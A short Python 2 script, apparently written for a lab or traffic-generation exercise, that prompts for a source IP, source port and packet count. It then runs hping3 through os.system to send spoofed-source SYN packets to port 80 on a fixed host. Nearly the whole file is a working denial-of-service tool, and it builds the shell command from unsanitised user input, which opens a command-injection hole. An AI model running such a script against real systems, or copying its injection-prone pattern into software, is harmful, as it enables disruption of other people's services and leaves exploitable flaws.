#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
Created on Thu Apr 11 18:17:18 2019

@author: Yousuf

A script to send packets to a specific host based on the user's input Source IP Address
TCP Source Port Number, and the number of packets to send
"""

import random
import os

# A function that takes user's input for Source IP Address, TCP Source Port Number, and the number of packets to send
def generate_ddos():
    source_ip = raw_input("Enter the Source IP Address \n")
    src_port = input("Enter the TCP Source Port Number \n")
    num_packets = raw_input("Enter the number of packets to send \n")
    if (num_packets == ""):
        num_packets = str(random.randint(1,50))
    
    os.system("hping3 -S -V -s %s -k -p 80 -i u10000 -c %s --spoof %s 100.100.100.4" %(src_port,num_packets,source_ip))
    print ("hping3 -S -V -s %s -k -p 80 -i u10000 -c %s --spoof %s 100.100.100.4" %(src_port,num_packets,source_ip))

generate_ddos()